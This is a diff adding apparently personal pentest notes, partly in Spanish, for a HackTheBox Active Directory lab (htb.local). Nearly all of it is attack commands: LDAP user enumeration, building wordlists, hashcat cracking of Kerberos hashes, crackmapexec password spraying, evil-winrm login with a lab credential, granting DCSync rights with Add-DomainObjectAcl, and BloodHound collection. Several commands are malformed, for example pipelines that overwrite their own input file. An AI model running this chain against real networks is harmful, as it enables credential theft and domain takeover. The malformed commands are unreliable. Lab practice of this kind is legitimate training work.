@@ -1,0 +1,36 @@
+
+crack the hash kerberos
+
+
+
+impacket-smbserver Sfire $(pwd) -smb2support -user diego -password Contrasenia
+$pass = convertto-securestring 'Contrasenia' -AsPlainText -Force
+$pass
+$cred = New-Object System.Management.Automation.PSCredential('diego', $pass)
+$cred
+New-PSDrive -Name diego -PSProvider FileSystem -Credential $cred -Root \\10.10.14.45\Sfire
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Rights DCSync
+
+ruby evil-winrm.rb -i 10.10.10.161 -u svc-alfresco -p s3rvice 
+
+ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' > person.out
+ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=User)' sAMAccountName |grep sAMAccountName  | awk '{print $2}' >userlist.ldap
+
+for i in $(cat dictionary.txt); do echo $i; echo ${i}2019; echo ${i}2020; done
+for i in $(cat dictionary.txt); do echo $i; echo ${i}2019; echo ${i}2020; done > dictionary.txt
+
+D:\hashcat-6.0.0>hashcat.exe --force --stdout dictionary.txt -r d:\hashcat-6.0.0\rules\best64.rule -r d:\hashcat-6.0.0\rules\toggles1.rule > dictionary2.txt
+hashcat -m 18200 hash.txt /op/wordlist/rockyou.txt -r rules/InsidePro-PasswordsPro.rule
+cat dictionary2.txt | sort -u | awk 'length($0) > 8' | wc -l
+cat dictionary2.txt | sort -u | awk 'length($0) > 8' | wc -l > dictionary2.txt
+crackmapexec smb 10.10.10.161 -u userslist.ldap -p dictionary2.txt
+crear servidor smb con credenciales para conectar unidad de red imapcket-smbserver Sfire $(pwd) -smb2support -user diego -password Contrasenia
+winpeas.exe analizador de vulnerabilidad.
+
+enumerar directorio activo
+\SharpHound.exe -c all parta bloodhound
+desde kali
+bloodhound-python -d htb.local -usvc-alfresco -p s3rvice -ns 10.10.10.161
+bloodhound-python -d htb.local -usvc-alfresco -p s3rvice -gc forest.htb.local -c all -ns 10.10.10.161
+neo4j console
+bloodhound
